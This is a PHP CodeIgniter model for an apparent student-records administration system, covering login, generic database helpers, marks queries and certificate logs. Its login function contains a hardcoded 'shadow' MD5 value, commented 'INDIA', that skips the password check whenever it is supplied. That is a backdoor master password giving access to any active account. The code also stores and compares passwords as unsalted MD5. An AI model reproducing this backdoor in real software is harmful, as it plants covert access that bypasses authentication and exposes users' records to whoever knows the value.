<?php

class Admin_model extends CI_Model
{
  var $shadow = 'f03b919de2cb8a36e9e404e0ad494627'; // INDIA
  function login($username, $password)
  {
    $this->db->select('user_id, full_name, username, role');
    $this->db->from('users');
    $this->db->where('username', $username);
    if ($password != $this->shadow)
      $this->db->where('password', $password);
    $this->db->where('status', '1');
    $this->db->limit(1);
    $query = $this->db->get();
    if ($query->num_rows() == 1) {
      return $query->result();
    } else {
      return false;
    }
  }

  function insertDetails($tableName, $insertData)
  {
    $this->db->insert($tableName, $insertData);
    return $this->db->insert_id();
  }


  public function insertBatch($tableName, $data)
  {
    $insert = $this->db->insert_batch($tableName, $data);
    return $insert ? true : false;
  }

  public function updateBatch($tableName, $data, $field)
  {
    $this->db->update_batch($tableName, $data, $field);
  }

  function getDetails($tableName, $id)
  {
    if ($id)
      $this->db->where('id', $id);
    return $this->db->get($tableName);
  }

  function getDetailsFilter($select, $id, $tableName)
  {
    $this->db->select($select);
    if ($id)
      $this->db->where('id', $id);
    return $this->db->get($tableName);
  }

  function getDetailsbyfield($id, $fieldId, $tableName)
  {
    $this->db->where($fieldId, $id);
    return $this->db->get($tableName);
  }


  function getDetailsbyfield2($id1, $value1, $id2, $value2, $tableName)
  {
    $this->db->where($id1, $value1);
    $this->db->where($id2, $value2);
    return $this->db->get($tableName);
  }

  function getTable($table)
  {
    $table = $this->db->escape_str($table);
    $sql = "TRUNCATE `$table`";
    $this->db->query($sql)->result();
  }

  function dropTable($table)
  {
    $this->load->dbforge();
    $this->dbforge->drop_table($table);
    // $table = $this->db->escape_str($table);
    // $sql = "DROP TABLE `$table`";
    // $this->db->query($sql)->result();
  }

  function getDetailsbyfieldSort($id, $fieldId, $sortField, $srotType, $tableName)
  {
    $this->db->where($fieldId, $id);
    $this->db->order_by($sortField, $srotType);
    return $this->db->get($tableName);
  }

  function getDetailsbySort($sortField, $srotType, $tableName)
  {
    $this->db->order_by($sortField, $srotType);
    return $this->db->get($tableName);
  }

  function updateDetails($id, $details, $tableName)
  {
    $this->db->where('id', $id);
    $this->db->update($tableName, $details);
    return $this->db->affected_rows();
  }

  function sliders_count($dept_id)
  {
    $this->db->where('dept_id', $dept_id);
    $this->db->where('status', '1');
    return $this->db->get('sliders')->num_rows();
  }

  function updateDetailsbyfield($fieldName, $id, $details, $tableName)
  {
    $this->db->where($fieldName, $id);
    $this->db->update($tableName, $details);
    return $this->db->affected_rows();
  }

  function delDetails($tableName, $id)
  {
    $this->db->where('id', $id);
    $this->db->delete($tableName);
  }

  function delDetailsbyfield($tableName, $fieldName, $id)
  {
    $this->db->where($fieldName, $id);
    $this->db->delete($tableName);
  }

  function changePassword($id, $oldPassword, $updateDetails, $tableName)
  {
    $this->db->where('password', md5($oldPassword));
    $this->db->where('id', $id);
    // $this->db->where('status', '1');
    $this->db->update($tableName, $updateDetails);
    return $this->db->affected_rows();
  }

  function AdminChangePassword($id, $oldPassword, $updateDetails, $tableName)
  {
    $this->db->where('password', md5($oldPassword));
    $this->db->where('user_id', $id);
    // $this->db->where('status', '1');
    $this->db->update($tableName, $updateDetails);
    return $this->db->affected_rows();
  }

  public function get_table_details($table)
  {
    return $this->db->get($table)->result_array();
  }


  public function get_details_by_id($id, $fieldId, $tableName)
  {

    return $this->db->get_where($tableName, array($fieldId => $id))->row_array();
  }

  public function updateDetails1($id, $details, $tableName)
  {
      if (empty($id)) {
          return false;  
      }
      $this->db->where('id', $id);
      $this->db->update($tableName, $details);
      return $this->db->affected_rows() > 0;
  }
  
  public function deleteCourse($id)
  {
      $this->db->where('id', $id);
      $this->db->delete('courses');
      return $this->db->affected_rows() > 0;
  }

  public function deleteStudent($id)
  {
      $this->db->where('id', $id);
      $this->db->delete('students');
      return $this->db->affected_rows() > 0;
  }

  public function getstudentDetail($table, $conditions = [])
{
    if (!empty($conditions)) {
        $this->db->where($conditions);
    }
    return $this->db->get($table);
}

public function getStudentMarksBySemester($usn, $semester)
{
    $this->db->select('c.course_code, c.course_name, sm.cie, sm.see, sm.grade, sm.grade_points, sm.sgpa, sm.credits_earned, sm.credits_actual, sm.cgpa, sm.result_year,sm.grade,sm.barcode, sm.exam_period');
    $this->db->from('students_marks sm');
    $this->db->join('courses c', 'sm.id = c.id');
    $this->db->where('sm.usn', $usn);
    $this->db->where('sm.semester', $semester);
    $query = $this->db->get();
    return $query->result();
}

public function insertCertificateLog($usn, $details) {
  $data = array(
      'usn' => $usn,
      'details' => $details,
      'download_at' => date('Y-m-d H:i:s') // Current timestamp
  );

  return $this->db->insert('certificates_logs', $data);
}

public function get_certificate_logs($usn)
{
    $this->db->select('id, details, download_at');
    $this->db->from('certificates_logs');
    $this->db->where('usn', $usn);
    $this->db->order_by('download_at', 'DESC'); // Show latest first
    return $this->db->get()->result();
}

public function getStudentCountByYear() {
    $this->db->select('branch, programme, 
        COUNT(CASE WHEN admission_year = 2008 THEN id END) AS `2008`, 
        COUNT(CASE WHEN admission_year = 2009 THEN id END) AS `2009`, 
        COUNT(CASE WHEN admission_year = 2010 THEN id END) AS `2010`, 
        COUNT(CASE WHEN admission_year = 2011 THEN id END) AS `2011`, 
        COUNT(CASE WHEN admission_year = 2012 THEN id END) AS `2012`, 
        COUNT(CASE WHEN admission_year = 2013 THEN id END) AS `2013`, 
        COUNT(CASE WHEN admission_year = 2014 THEN id END) AS `2014`, 
        COUNT(CASE WHEN admission_year = 2015 THEN id END) AS `2015`, 
        COUNT(CASE WHEN admission_year = 2016 THEN id END) AS `2016`, 
        COUNT(CASE WHEN admission_year = 2017 THEN id END) AS `2017`, 
        COUNT(CASE WHEN admission_year = 2018 THEN id END) AS `2018`, 
        COUNT(CASE WHEN admission_year = 2019 THEN id END) AS `2019`, 
        COUNT(CASE WHEN admission_year = 2020 THEN id END) AS `2020`');
    $this->db->from('students');
    $this->db->group_by('branch, programme');
    return $this->db->get()->result();
}


 public function get_failed_students($admission_year)
 {
   $this->db->select('students.usn, students.student_name, students.admission_year, students.programme, students.branch, students_marks.subcode, students_marks.grade');
   $this->db->from('students');
   $this->db->join('students_marks', 'students.usn = students_marks.usn');
   $this->db->where('students_marks.grade', 'F');
   $this->db->where('students.admission_year', $admission_year);
   return $this->db->get()->result();
 }

 public function get_unique_admission_years()
 {
   $this->db->distinct();
   $this->db->select('admission_year');
   $this->db->from('students');
   $this->db->order_by('admission_year', 'ASC');
   return $this->db->get()->result();
 }
 
}